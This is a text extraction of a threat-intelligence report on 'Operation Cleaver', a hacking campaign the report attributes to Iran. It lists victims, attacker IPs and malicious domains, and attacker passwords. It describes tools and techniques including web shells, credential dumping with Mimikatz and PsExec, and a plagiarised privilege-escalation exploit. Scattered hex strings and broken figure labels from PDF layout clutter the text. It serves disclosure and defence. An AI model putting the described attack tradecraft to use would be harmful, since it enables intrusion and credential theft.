476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
BACKGROUND
Iran has been severely impacted by debilitating and extremely
advanced malware campaigns since at least 2009 . Famous
examples of these efforts include industrial sabotage via
Stuxnet ( 2009 - 2010 ) , and espionage with Duqu ( 2009 - 2011 )
as well as Flame ( 2012 ) . These campaigns have targeted Iran ’s
nuclear program , and oil and gas operations . Stuxnet was an
eye - opening event for Iranian authorities , exposing them to the
world of physical destruction via electronic means .
Hacking campaigns sourced out of Iran are nothing new . Since the early 2000 ’s , the information
security industry as a whole has tracked teams like the Iranian Cyber Army , which mainly focuses
on patriotic hacking ( website defacements ) . After the release of Stuxnet , Iran ’s motivations appear
to have shifted . Retaliation for Stuxnet began almost immediately in 2011 with campaigns like the
certificate compromises of Comodo and DigiNotar . These attacks served as a warning , showcasing
the rapid evolution of Iran ’s hacking skills .
A major retaliation came in the form of 2012 ’s Shamoon campaign , which impacted RasGas and
Saudi Aramco . It ’s estimated that Shamoon impacted over 30,000 computer endpoints and cost
the affected companies tens - of - thousands of hours recovering from the attacks . The direct financial
impact from this retaliation and amount of downtime experienced were staggering . Shamoon was
truly a watershed event for security defenders . It was the first glimpse into the real capabillity and
intention of Iranian cyber operations . We see the same motivation and intent here in Operation
Cleaver : establishing a beachhead for cyber sabotage .
We saw further Iranian backlash in late 2012 and early 2013 in the form of Operation Ababil ’s
Distributed Denial of Service ( DDoS ) attacks against US banks . These attacks were debilitating and
impacted the availability of online banking services . Yet more backlash was witnessed with FireEye ’s
exposure of Operation Saffron Rose , an espionage campaign executed by the Ajax Security Team
in 2014 . In May 2014 , evidence emerged of a highly targeted waterhole attack that leveraged social
media , dubbed Operation Newscaster , which was uncovered by iSight Partners .
In June 2013 , Israeli Prime Minister Benjamin Netanyahu accused Iran of carrying out “ non - stop ”
attacks on “ [ Israel ’s ] vital national systems ” including “ water , power and banking”4 . The following
September of 2013 , the Wall Street Journal accused Iran of hacking into unclassified U.S. Navy
computers in San Diego ’s NMCI ( Navy Marine Corp Intranet),5 which we can confirm was part of
Operation Cleaver .
6
# OPCLEAVER
While previously reported operations attributed to Iran have largely focused on Defense Industrial
Base ( DIB ) companies , the United States Federal Government , or targets in Middle Eastern countries ,
Operation Cleaver has instead focused on a wide array of targets , including energy producers
and utilities , commercial airlines and airports , military intelligence , aerospace , hospitals , and
even universities – with only ten of the targets based in the United States . Such broad targeting
demonstrates to the world that Iran is no longer content to retaliate against the US and Israel alone .
They have bigger intentions : to position themselves to impact critical infrastructure globally .
ORIGINATION                                                                                                           RETALIATION
2010
f20476 f64
StUXNEt
6
4 4       2011
20
c
duqu
c2
~
04576696
DigiNotar
2012
FL ME
SHAM                                              N
GAUSS
2
OPERATION
b
Ababil
e6
2013
6
NMC
NMC
NMCI
CII
9
NAVY MARINE CORPS INTRANET
86
2014
546
Saffr n Rose
NEWSCASTER
476f6f64
6f20
44
20
2c
b204576696c
e6
96
86
546
Figure 1 : The sequence of major Iran - centric attacks ; either as victims ( left ) or attackers ( right ) .
7
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
WHY THE NAME CLEAVER ?
The string cleaver is found several times in a variety of custom software used in Operation
Cleaver , including :

1    Numerous references inside the namespaces of their custom bot code
codenamed TinyZBot , e.g. :

e:\projects\cleaver\trunk\zhoupin_cleaver\obj\x86\release\netscp.pdb



2    PDBs associated with the hacker name “ Jimbp ” , e.g. :
c:\users\jimbp\desktop\binder_1 - for cleaver\binder_1\obj\x86\release\setup.pdb



3    PDBs associated with the keystroke loggers , artifacts , and numerous other tools , e.g. :
e:\Projects\Cleaver\trunk\MainModule\obj\Release\MainModule.pdb
WHY EXPOSE IRAN NOW ?
We believe our visibility into this campaign represents only a fraction of Operation Cleaver ’s full
scope . We believe that if the operation is left to continue unabated , it is only a matter of time
before the world ’s physical safety is impacted by it . While the disclosure of this information will
be a detriment to our ability to track the activity of this group , it will allow the security industry as
a whole to defend against this threat . As such , we are exposing this cyber campaign early in an
attempt to minimize additional real - world impact and prevent further victimization .
8
CRITICAL DISCOVERIES
6f20476f6f64
44
20
c
c2
b204576696
6e6
9
86
546
# OPCLEAVER
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
CRITICAL DISCOVERIES
Iranian Actors Are Behind Operation Cleaver
• 	  Persian hacker names are used throughout the campaign including : Salman Ghazikhani ,
Bahman Mohebbi , Kaj , Parviz , Alireza , and numerous others .
• 	  Numerous domains used in the campaign were registered in Iran .
• 	  Infrastructure leveraged in the attack was registered in Iran to the corporate entity Tarh
Andishan , which translates to “ invention ” or “ innovation ” in Farsi .
• 	  Source netblocks and ASNs are registered to Iran .
• 	  Hacker tools warn when their external IP address traces back to Iran .
• 	  The infrastructure is hosted through Netafraz.com , an Iranian provider out of Isfahan , Iran .
• 	  The infrastructure utilized in the campaign is too significant to be a lone individual or a small
group . We believe this work was sponsored by Iran .
Operation Cleaver Targets Critical Infrastructure Around the World
• 	  US Military targets including NMCI in October 2013.5 Confirmed targeting of global
government entities .
• 	  Networks and systems targeted in critical industries like energy and utilities , oil and gas , and
chemical companies .
• 	  Assets ( both cyber and physical ) and logistics information were compromised at major airline
operators , airports , and transportation companies .
• 	  Various global telecommunications , technology , healthcare , aerospace , and defense
companies were breached as part of the operation .
• 	  Confidential critical infrastructure documents were harvested from major educational
institutions around the world .
Iran ’s Cyber Hacking Skills Have Evolved
• 	  Initial compromise techniques include SQL injection , web attacks , and creative deception-
based attacks – all of which have been implemented in the past by Chinese and Russian
hacking teams .
• 	  Pivoting and exploitation techniques leveraged existing public exploits for MS08 - 067 and
Windows privilege escalations , and were coupled with automated , worm - like propagation
mechanisms .
• 	  Customized private tools with functions that include ARP poisoning , encryption , credential
dumping , ASP.NET shells , web backdoors , process enumeration , WMI querying , HTTP and
SMB communications , network interface sniffing , and keystroke logging .
• 	  The ability to build customized tools to compromise any target they choose .
10
# OPCLEAVER
Indicators of Compromise ( IOC )
• 	  Private signing certificates of one victim were captured allowing the Operation Cleaver team to
compromise the entirety of their organization .
• 	  Over the past two years , Cylance has collected over 8 GB of data including over 80,000 files of
exfiltrated data , hacker tools , victim logs , and highly sensitive reconnaissance data .
• 	  Data from sinkholed command and control servers has allowed us to track this active campaign .
• 	  Cylance is releasing more than 150 IOCs and samples associated with the Cleaver campaign to
empower the security community to detect existing compromises in their own organizations , as
well as potentially block future attacks from these teams .
Speculation
•
6f20476 f64
This campaign continues Iran ’s retaliation for Stuxnet , Duqu , and Flame .
•
44
This is a state - sponsored campaign .
•
• 	                           20
There is a possibility that this campaign could affect airline passenger safety .
This campaign ’s intentions may be to damage Industrial Control Systems ( ICS ) , Supervisory
c
c2
Control and Data Acquisition ( SCADA ) systems , and impact Critical Infrastructure and Key
Resources ( CIKR ) .
04576696
• 	  This campaign could be a way to demonstrate Iran ’s cyber capabilities for additional
geopolitical leverage , due to the breadth and depth of their global targets .
• 	  There is an intense focus on CIKR companies in South Korea , which could give Iran additional
clout in their burgeoning partnership with North Korea . In September 2012 , Iran signed an
extensive agreement for technology cooperation agreement with North Korea , which would
allow for collaboration on various efforts including IT and security.6
• 	  Iran is recruiting from within the universities and potentially using ‘ hackers for hire’.7
6b2
6e
9
86
546
11
TARGETS & VICTIMS
6f20476f6f64
044
2
c
c2
b204576696
6e6
9
686
54
# OPCLEAVER
# OPCLEAVER
TARGETS & VICTIMS
The Cleaver team targets some of the most sensitive global critical infrastructure companies in the
world , including military , oil and gas , airlines , airports , energy producers , utilities , transportation ,
healthcare , telecommunications , technology , manufacturing , education , aerospace , Defense
Industrial Base ( DIB ) , chemical companies and governments . Countries impacted include Canada ,
China , England , France , Germany , India , Israel , Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South
Korea , Turkey , United Arab Emirates , and the US .
The following is a breakdown by country of which industries were targeted and/or victimized :
Canada                        Kuwait                     South Korea
- Energy & Utilities
6f20476 f64
- Oil & Gas                - Airports
- Oil & Gas
44 - Telecommunications       - Airlines
20 Mexico
- Hospitals                                             - Education
- Technology
c
China                         - Oil & Gas                - Heavy Manufacturing
c2
- Aerospace
04576696
Pakistan                   Turkey
- Airports                 - Oil & Gas
England
- Education                   - Hospitals
- Technology               United Arab Emirates
France                        - Airlines                 - Government
- Oil & Gas                                             - Airlines
2
Qatar
b
Germany                       - Oil & Gas
United States
6
- Government
e
- Telecommunications                                    - Airlines
- Airlines
6
- Education
9
India                       86                           - Chemicals
- Education                   Saudi Arabia               - Transportation
546   - Oil & Gas                - Energy & Utilities
- Airports                 - Military / Government
Israel                                                  - Defense Industrial Base
- Aerospace
- Education
13
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Cleaver ’s level of access into each organization varied greatly , including completely compromised
systems and networks , Active Directory domain controllers and credentials , compromised data
repositories and stolen VPN credentials .
Compromised systems include Microsoft Windows web servers running IIS and ColdFusion ,
Apache with PHP , many variants of Microsoft Windows desktops and servers , and Linux servers .
Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers .
Unlike Stuxnet , no exotic exploitations ( such as 0-days ) were observed .
Within our investigation , we had no direct evidence of a successful compromise of specific
Industrial Control Systems ( ICS ) or Supervisory Control and Data Acquisition ( SCADA ) networks , but
Cleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing
them to directly affect the systems they run . This data could enable them , or affiliated organizations ,
to target and potentially sabotage ICS and SCADA environments with ease .
We discovered over 50 victims in our investigation , distributed around the globe . Ten of these
victims are headquartered in the US and include a major airline , a medical university , an energy
company specializing in natural gas production , an automobile manufacturer , a large defense
contractor , and a major military installation . The four targets in Israel and the five targets in Pakistan
are comprised of education , aerospace , airports , airlines , healthcare and technology . Further victims
were identified in numerous Middle Eastern countries as well as ones in Northern Europe including
the UK , France , and Germany . Central America was not immune either with a large oil and gas
company on the list . In fact , oil and gas was a particular focal point for the Cleaver team , going after
no less than nine of these companies around the world .
Universities were targeted in the US , India , Israel , and South Korea . The attackers targeted research
efforts , student information , student housing , and financial aid systems . They had a penchant for
pictures , passports , and any specifc identifying information .
Perhaps the most bone - chilling evidence we collected in this campaign was the targeting and
compromise of transportation networks and systems such as airlines and airports in South Korea ,
Saudi Arabia and Pakistan . The level of access seemed ubiquitous : Active Directory domains
were fully compromised , along with entire Cisco Edge switches , routers , and internal networking
infrastructure . Fully compromised VPN credentials meant their entire remote access infrastructure
and supply chain was under the control of the Cleaver team , allowing permanent persistence
under compromised credentials . They achieved complete access to airport gates and their security
control systems , potentially allowing them to spoof gate credentials . They gained access to PayPal
and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered
access to the victim ’s domains . We were witnessed a shocking amount of access into the deepest
parts of these companies and the airports in which they operate .
14
# OPCLEAVER
COUNTRIES TARGETED
4        6
1                        2
3
B
A               A                    5                                         B                      22
B
A                                 A                        7
B
A                                                                                                                    21
B                                             23
B          B
13                                                                       B
6f20476 f64
44
20
c
c2
04576696
24                                 17 15
30
8
9
12                   16
8
10
11
29                                                                                              25
33                   35                                                                   14
20         19 18
34                                                 26
28
32         31
27
A                                                                                 B
31
2
27
6b
6e
TARGET LOCATIONS
9
86
1 . Canada - Calgary                      13 . Mexico - Mexico City                           25 . UAE - Abu Dhabi
2 . Canada - Hamilton      546             14 . Pakistan - Karachi ( 2 )                         26 . UAE - Al Garhoud
3 . China - Beijing                       15 . Pakistan - Lahore                              27 . USA - California - Los Angeles ( 2 )
4 . England - Oxford                      16 . Pakistan - Multan                              28 . USA - California - San Diego
5 . France - Paris                        17 . Pakistan - Peshawar                            29 . USA - California - San Jose
6 . Germany - Dusseldorf                  18 . Qatar - Doha ( 4 )                               30 . USA - Michigan - Dearborn
7 . Germany - Frankfurt                   19 . Saudi Arabia - Dhahran                         31 . USA - Texas - Houston ( 2 )
8 . India - New Delhi ( 2 )                 20 . Saudi Arabia - Jeddah                          32 . USA - Texas - Fort Worth
9 . Israel - Haifa ( 3 )                    21 . South Korea - Incheon                          33 . USA - Texas - Southlake
10 . Israel - Rehovot                     22 . South Korea - Goyang - si                        34 . USA - Virginia - Fairfax
11 . Kuwait - Ahmadi                      23 . South Korea - Seoul ( 7 )                        35 . USA - Virginia - McLean
12 . Kuwait - Kuwait City                 24 . Turkey - Antalya
Figure 2 : Geographic distribution of victims , as determined by the global headquarters of the parent
company or organization breached .
15
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
INDUSTRIES TARGETED
HIGH
LEVEL OF ACCESS
MEDIUM
LOW
GY
S
E
N
AS
G
L
N
N
LS
T
AC
LS
O
S
ES
IA
IN
LO
O
S
O
EN
G
RT
I
A
IE
TR
AT
UR
A
I
I
SP
AT
AT
IN
O
IC
&
M
IT
IT
O
UC
US
RL
N
T
RO
EM
RT
RN
IC
IL
SP
IL
RP
CH
AC
UT
UN
O
AI
D
ED
O
VE
AE
CH
O
AI
IN
UF
TE
SP
H
M
&
O
SE
M
AN
AN
G
GY
CO
EN
M
ER
TR
LE
EF
EN
TE
D
LEVEL OF CRITICAL IMPACT
Figure 3 : Number of Cleaver victims by the level of access obtained as well as the level of critical impact potential .
16
ATTRIBUTION
6f20476f6f64
44
20
c
c2
b204576696
6e6
9
86
546
# OPCLEAVER
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
ATTRIBUTION
Despite today ’s trend toward attacker attribution , we believe
it offers little real benefit to the day - to - day cyber defender .
However , in this report we offer our observations on the
sources of Operation Cleaver in order to benefit those that
rely on attribution such as Law Enforcement .
Operation Cleaver is believed to consist of at least 20
hackers and developers , collaborating on projects and
missions to support Iranian interests . Many of the targets were
predominately English - speaking and a majority of the team
members were capable of reading and writing in English . We
present evidence that this team is operating , at least in part ,
out of Iran and in the interests of Iran . The skills and behavior
of the Operation Cleaver teams are consistent with , and in
one case surpasses , Iran ’s cyber capabilities as we know
them today .
For a complete list of IPs and domains related to this
campaign , please refer to the Indicators of Compromise               Figure 4 : The logo of the Army of the
Guardians of the Islamic Revolution ,
section .
also known as the Islamic Revolutionary
Guard Corps ( IRGC ) .
ATTACKER IP ADDRESSES
Over the course of multiple incident response engagements related to Operation Cleaver , we
were able to identify a small set of IP addresses which were commonly used during the initial
stages of an attack .
The IP address 78.109.194.114 served as a source for one of the primary attackers .
They were observed conducting SQL injections , controlling backdoors , as well as exfiltrating
information using this address , and the address appears in multiple software configurations
recovered from staging servers over a period of time .
GeoIP Location : Iran
Net block : 78.109.194.96 - 78.109.194.127
Owner : Tarh Andishan
Email : tarh.andishan(at)yahoo.com
Phone : + 98 - 21 - 22496658
NIC - Handle : TAR1973-RIPE
18
# OPCLEAVER
This IP address was also observed in multiple software configurations . This particular net block
was used over an extended period of time , indicating these were under the Cleaver team ’s
physical control . Additionally , prior netblocks used by the same team demonstrated to us that
this was n’t simply a case of proxying or “ island hopping ” . For more information see the Tarh
Andishan section of this report .
The IP address 159.253.144.209 was a source for a secondary attacker in various
compromises . They were observed conducting SQL injection attacks . While this IP was this
registered in the Netherlands , we believe they used Softlayer ’s Citrix demo environment to
launch these attacks which is consistent with proxying or “ island hopping ” .
GeoIP Location : Netherlands
Net block : 159.253.144.208 - 159.253.144.223
ASN : Softlayer Technologies , Inc.
20476 f64
IP Location : Netherlands , Amsterdam with Iranian sourcing .
46f
04
ATTACKER 2DOMAINS
c
c2
A number of Cleaver ’s attack methods require a persistent server . In many cases , these servers
were referenced by domain names . The following malicious domains are operated by this
04576696
organization and are grouped by the registrant ’s email address .
davejsmith200(at)outlook.com       azlinux73(at)gmail.com
• 	    Teledyne - Jobs.com                  • MicrosoftServerUpdate.com
• 	    DownloadsServers.com               • WindowsSecurityUpdate.com
• 	    NorthropGrumman.net                • WindowsServerUpdate.com
2
• 	    MicrosoftMiddleAst.com
b
domain(at)netafraz.com
6
salman.ghazikhani(at)outlook.com • EasyResumeCreatorPro.com
e
• 	  Doosan - Job.com                    • MicrosoftWindowsResources.com
96
6
btr.8624(at)yahoo.com
8               msnhst(at)microsoft.com
• 	                    546
GoogleProductUpdate.net            • MicrosoftWindowsUpdate.net
• 	    WindowsCentralUpdate.com
• 	    WindowsUpdateServer.com
• 	    DriverCenterUpdate.com
As is typical with malicious domains , the Whois data for most of these domains contained falsified
information .
We managed to obtain a large collection of the internally developed tools used by the Cleaver
team , many of which were developed by its members . Due to operational security failures , these
tools contain information that provided us insight into their organization and operations .
19
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
TOOLS & SOFTWARE
Shell Creator 2
In the tool named Shell Creator 2 , there are three main components . The creator generates
an ASPX web shell using user input as well as a collection of templates . The web shell could
then be installed via xp_cmdshell , or any other method which would grant the attacker write
access . The web shell is accessible by the shell client directly .
The shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised
computer . We originally located it on a staging server being utilized for multiple attacks as well as
a tool for sharing data between members of the organization ’s team .
The shell client , which is developed in Java and is easily decompiled , is a simple interface with
a feature to protect the operator from making a critical mistake . When executed , and before
any connection to an instance of the web shell is initiated , the shell client communicates with
freegeoip.net in order to get the external IP address of the current user . The country of origin
is then shown to the user , to inform them of what country it appears they are connecting from .
The assumed purpose of this feature is to ensure that a proper proxy is in use , and the real origin
of the attacker is not revealed .
After decompiling the shell client , we found the following code segment controlling the display of
this IP location information .
Figure 5 : Java source code showing how Shell Creator 2 distinguishes between a source IP address
coming from Iran ( red ) versus any other country ( green ) .
This code handles the XML response from freegeoip.net , and displays the information
as different colors based on different attributes . For instance , if the string “ ERROR ” is in the
response , the text is displayed with the color magenta . If the string IRAN is in the response , the
text is displayed with the color red . It should be noted that no other country name contains the
substring IRAN .
20
# OPCLEAVER
Shell Creator 2 ( cont . )
Figure 6 : Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran .
6   f 20476 f64
Figure 7 : Shell Creator4
4     2 notifies the user in green when their source IP address is not Iran .
20
c
c2
Net Crawler
04576696
Net Crawler is a tool developed in C # that exhibits worm - like behavior in order to gather cached
credentials from any and all accessible computers on an infected network . This is done with
Windows Credential Editor ( WCE ) and Mimikatz in combination with PsExec . Different versions of
this malware contain ASCII art which names the authoring group as Zhoupin ( in “ leetspeak ” as
“ Zh0up!n ” ) .
6b2
6e
9
86
546
Figure 8 : Net Crawler version 1.0 has ASCII art showing                 Figure 9 : Updated ASCII art found in Net
the use of “ Zh0up!n ” in the campaigns tools .                            Crawler tool shows a version of “ Zh0up!n ”
shortened to simply “ Zh0 ” .
For more information on Net Crawler , see the Tactics , Techniques and Procedures section .
21
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
TinyZBot
TinyZBot is a bot written in C # and developed by the Cleaver team . It is the longest developed
malware family discovered by this group , and has been used in campaigns for close to two
years . How it operates can vary greatly from version to version . For a detailed technical analysis
of TinyZBot , see the Tactics , Techniques and Procedures section . As TinyZBot is developed in
C # , many versions can be decompiled to code very similar to their originals , including names
of namespaces . Many versions were obfuscated with a legitimate tool for developers named
SmartAssembly , which makes the recovery of some names implausible .
We obtained multiple versions from which we were able to recover many of the original names of
variables and namespaces . In a number of these samples , the primary namespace for TinyZBot
is named Zhoupin_Cleaver . In every version of TinyZBot that is not obfuscated , there is a
code base referred to as Cleaver . This code base is also shared in other malware developed by
this organization , such as Csext .
PrivEsc
PrivEsc is a blatant plagiarism of an existing exploit for Microsoft Windows released in January
2010 called MS10 - 015 , “ Vulnerabilities in Windows Kernel Could Allow Escalation of Privilege ” ,
popularly known as the KiTrap0D exploit which was released publicly . The Cleaver team clearly
modified the source code and compiled a new version . The only detectable modification was to
change the original author ’s name to instead display the following :
Zhopin Exploit Team
This is not the only case of this team relabeling others’ work as their own .
Logger Module
Logger module is a component of the PVZ ( PVZ is shorthand for Parviz , one of the members of
the Cleaver team ) bot tool chain . When executed , it will capture the user ’s keystrokes and save
them to a location which PVZ bot then exfiltrates . The logger module binary ’s file description
value is the following :
ye file khube DG . ba in ham kari nadashte bashin
Roughly translated from Persian , this text says :
DG is a good file , do n’t bother with this
22
# OPCLEAVER
Logger Module ( cont . )
This text could potentially be a note intended to stay internal , or could be an attempt to persuade
an unsuspecting victim to assume the file is not malicious . The Product Name value is GOOD FILE .
For more information on the PVZ bot tool chain , see the Tactics , Techniques , and Procedures
section .
CCProxy
CCProxy is a publicly available proxy server for Windows , which can handle a variety of protocols .
We do not believe that this organization was involved in the development or modification of
CCProxy , but they have been observed using it . We recovered a CCProxy configuration , which
exposed various operational details .
6f 2 0476 f64
4 as well as a
The configuration allowed for remote
4
20 was User-001 ,
connections , limited by a username
limited IP range . The username
c
which is the default value . The limited IP range
c2
covered one IP : 78.109.194.114 .
04576696
This IP address is located in Iran , and is owned by
Tarh Andishan .
The configuration also indicates which address
the CCProxy server should listen on for incoming
connections such as web ( 80 ) and mail ( 25 ) .
6b2
6e
9
86
546
Figure 10 ( above ) : CCProxy configuration file
using the hardcoded IP address registered to Tarh
Andishan .
Figure 11 ( left ) : CCProxy configuration file showing the
use of web and mail as listening ports .
23
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
NMAP Log
Log output from the network port scanning application NMAP was recovered from a staging
server . This log was generated during the usage of the nbrute utility , which brute - forces network
credentials and relies on NMAP to do so . The header of this NMAP log indicates that the computer
used to run nbrute / nmap was set to Iran Daylight Time at the time of execution .
Starting Nmap 6.25 at 2012 - 08 - 17 09:18 Iran Daylight Time
With no known victims located in Iran , it is likely that this was executed on an attacker ’s computer ,
and not on a victim ’s computer .
Squid Configuration
A configuration file for a Squid proxy server was recovered .
Figure 12 : Squid configuration file showing the use of Tarh Andishan ’s IP address .
The net range of 78.109.194.114/28 was inserted into the allowed local networks with an RFC
comment appended in order to make it look like it was part of the default configuration . It is likely
this is the same reason a /28 net range was used , in order to not look like it was intended to only
allow one IP . This would give the same access to resources accessible from the Squid proxy server
to this Iranian IP address .
TARH ANDISHAN
Tarh Andishan is listed as the registrant for a number of small net blocks based upon the email
address tarh.andishan(at)yahoo.com . The net blocks appear to rotate over time and
registrant information is altered to accommodate ongoing operations and avoid potential public
exposure .
24
# OPCLEAVER
TARH ANDISHAN ( cont . )
The networks are included below as well as the last time that net block was observed as active .

• 78.109.194.96/27 - Current
• 217.11.17.96/28 - 10/22/2014
• 81.90.144.104/29 - 10/5/2014
• 31.47.35.0/24 – 11/2012
There are many seemingly legitimate Tarh Andishan related companies inside Tehran , but strong
connections to Iranian backing have been difficult to prove definitively . “ Tarh Andishan ” is often
translated as “ Thinkers ” , “ Innovators ” and “ Inventors ” .
6 f 20476 f64
The net blocks above have strong associations with state - owned oil and gas companies . These
4
companies have current and former employees who are ICS experts .
4
Tarh Andishan has been 2
0
suspected in the past of launching attacks in the interest of Iran . The
c
operators of the blog IranRedLine.org , which comments on Iran ’s nuclear weapons efforts , has
c2
mentioned in multiple posts having been the target of debilitating brute - force authentication attacks
04576696
from IP addresses registered to the same Tarh Andishan team found in Cleaver .
In one of IranRedLine.org ’s blog posts8 , the author speculates on Tarh Andishan ’s involvement
with the Iranian government by showing close proximity to SPND , the Organization of Defensive
Innovation and Research ; however , the phone number listed under the registrant contact
information has yet to be completely validated .
6b2
6e
9
86
546
Figure 13 : This image from IranRedLine.org demonstrates Tarh Andishan ’s probably fabricated Whois
address to the proximity to Iran ’s SPND ( Organization of Defensive Innovation and Research ) .
25
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
MEMBERS
During this investigation , we were able to compile a considerable amount of information on some of
the members of this organization . The following profiles were built from reverse engineering , code
analysis , open source intelligence , incident response and forensics work . Personally identifiable
information about these members is not being shared publicly as it could endanger their lives and
would be irresponsible .
Parviz
Parviz is a developer who worked on a variety of projects , and was primarily active in 2013 . His
development skillset is based around his ability to develop in C / C++ . He has been observed using
Visual Studio 2010 , and his tools are written exclusively for Windows . Some of his tools were found
to be packed with ASPack .
Parviz is the primary developer of the PVZ bot and multiple parts of its tool chain . Parviz is likely
associated with the PVZ bot as his name in hardcoded into the PDB file paths .
The PVZ tool chain includes a variety of functionality , such as HTTP command and control
communications with an ASPX server - side component , a denial of service tool they developed , and
the public project named XYNTService used to run ordinary applications as services .
PDBs
• C:\Users\parviz\documents\visual studio 2010\Projects\BotManager\
Release\BotManager.pdb
• C:\Users\parviz\Documents\Visual Studio 2010\Projects\socket - test\
Release\socket - test.pdb
• C:\Users\parviz\Documents\Visual Studio 2010\Projects\
XYNTServiceProject\XYNTServiceProject\Debug\XYNTService.pdb
• C:\Users\Parviz\documents\visual studio 2010\Projects\SendModule\
Release\SendModule.pdb
26
# OPCLEAVER
Nesha
Nesha is one of the offensive members of this organization . Nesha was seen in breaches involving
SQL injection as well as other techniques . Nesha often utilized web - based backdoors developed
in ASPX , PHP as well as ColdFusion . A copy of an MS08 - 067 exploit developed in Python was
recovered in which Nesha shamelessly replaced the original author ’s name with his own .
Nesha ’s passwords very commonly include own handle . His passwords were frequently stored
as hashes in backdoors , but common hash cracking methods were able to recover the plaintext
versions . His observed password use is as follows :
•    nesha nesha used as password in ColdFusion backdoors
•    NeshaNesha12 used as password in ASPX backdoors .
20476 f64
•    nesha123 was found as a password in a recovered credential file with unknown association
4 6 f
0 4
Cylance observed Nesha participating in compromises involving the following techniques :
• SQL injection
2
c
c2
•    Web backdoors
•    Cached credential dumping
04576696
Nesha has additionally been identified using a variety of internally developed tools as well as the
following publicly available tools :
•    Cain & Abel
•    PsExec
2
•    PLink
b
•    NetCat
e6
Alireza
96
86
Alireza appears to be one of the senior developers of this organization . His tools are commonly
546
developed in C++ , Java , and C # ( desktop and ASPX ) . These tools are often support tools , either
monitoring the activity of other tools or supplementing the function of other tools gathering
information during the infiltration process . Alireza ’s code appears to be reused internally on
projects such as TinyZBot . Alireza appears to be using a version control system for his code , and
it is likely that others are using the same system . Based on the paths , the version control system in
use is likely Apache ’s Subversion . Use of a version control system is indicative of code sharing , but
the use of an older system like Subversion , along with other evidence , suggests there is not a large
amount of collaboration on projects and likely one developer working on each project at a time .
This is not behavior typical of a professional development team .
27
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Alireza ( cont . )
Alireza ’s C # tools include the following techniques :
•     Querying Windows Management Instrumentation Command - line ( WMIC )
•     Cached credential dumping
•     Generating ASPX shells
•     Encryption
•     Process enumeration
Alireza ’s Java tools include the following techniques :
•     HTTP communications
•     GUI development
Alireza ’s C++ tools include the following techniques :
•     WinPcap interface
•     ARP poisoning
•     HTTP communications
•     SMB communications
PDBs
• C:\Users\alireza\Documents\Visual Studio 2010\CPPProjects\IDCSercive\
trunk\Release\kagent.pdb
• C:\Users\alireza\Documents\Visual Studio 2010\CPPProjects\
PcapServiceInstaller\Release\PcapServiceInstaller.pdb
• C:\Users\alireza\Documents\Visual Studio 2010\Projects\
AntiVirusDetectorConsole\AntiVirusDetectorConsole\obj\x86\Release\
AntiVirusDetectorConsole.pdb
• C:\Users\alireza\Documents\Visual Studio 2010\Projects\
mimikatzWrapper\mimikatzWrapper\obj\x86\Debug\mimikatzWrapper.pdb
• C:\Users\alireza\Documents\Visual Studio 2010\Projects\ShellCreator2\
ShellCreator2\obj\x86\Debug\ShellCreator2.pdb
• c:\Users\alireza\Documents\Visual Studio 2012\Projects\BackDoorLogger\
BackDoorLogger\obj\Debug\BackDoorLogger.pdb
28
# OPCLEAVER
kaJ
kaJ is a .NET developer , and has only been observed working in C#. He has less English language
proficiency than others in the organization , and likely has a supplemental role during compromises .
He has been observed developing tools which cater to specific challenges in a compromise . His
notable project was named Net Crawler , and a technical analysis of this tool can be found in the
Tactics , Techniques and Procedures section . Thanks to a recovered test configuration for Net
Crawler , we were able to determine that kaJ ’s development computer has the name dev - castle ,
where he has the username kaJ and the password oaolrJ@vad . kaJ is believed to be the creator
of the Zhoupin ASCII art displayed in Net Crawler .
kaJ ’s projects include the following techniques .
20476 f64
•    Interfacing with multiple cached credential dumping tools
•    Interfacing with PsExec
46f
•    Worming behavior           4
20
Jimbp
c
c2
04576696
Jimbp is a .NET developer with minimal experience . His projects appear to be supplemental to
TinyZBot and are very simplistic . It is believed he is the developer of the project Binder_1 . This
project was a simple malware binder which required manual configuration when compiling . His
other work included creating a new service wrapper for TinyZBot .
PDBs
2
• c:\Users\Jimbp\Desktop\Binder_1\Binder_1\obj\x86\Release\Setup.pdb
b
• c:\Users\Jimbp\Desktop\Binder_1 - for cleaver\Binder_1\obj\x86\
e6
Release\Setup.pdb
6
• c:\Users\Jimbp\Documents\Visual Studio 2013\Projects\
9
TestForInstallingService\TestForInstallingService\obj\Release\
86
TestForInstallingService.pdb
546
29
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
TEAMS
Of course many associated Iranian hacker teams have been identified in public and private
security circles . Some of the teams publicly known today include Iranian Cyber Army , Ashiyane ,
Islamic Cyber Resistance Group , Izz ad - Din al - Qassam Cyber Fighters , Parastoo , Shabgard , Iran
Black Hats and many others9 .
However , even though the TTPs of the Cleaver team have some overlap to techniques used by
Iranian Cyber Army ( botnets ) , Ashiyane ( SQL injection ) and Syrian Electronic Army ( phishing and
RATs ) , we believe this is largely the work of a new team . Some connections to Ashiyane were
discovered in our investigations including a reference to hussein1363 , who had prior ties to
the hacker group . Additional connections between team members and individuals exist but are
predominantly speculative and have only been shared with law enforcement .
Ultimately we believe the Cleaver team is a mix of existing team members and new recruits
pulled from the universities in Iran .
30
# OPCLEAVER
TACTICS , TECHNIQUES
& PROCEDURES
TTP COVER HERE
6f20476f6f64
044
2
c
c2
c2b204576696
6f20476 f64
44
20
6c
6e
04576696
9
686
54
6b2
e
96
86
546
# OPCLEAVER
31
476f6f64
6f20
44
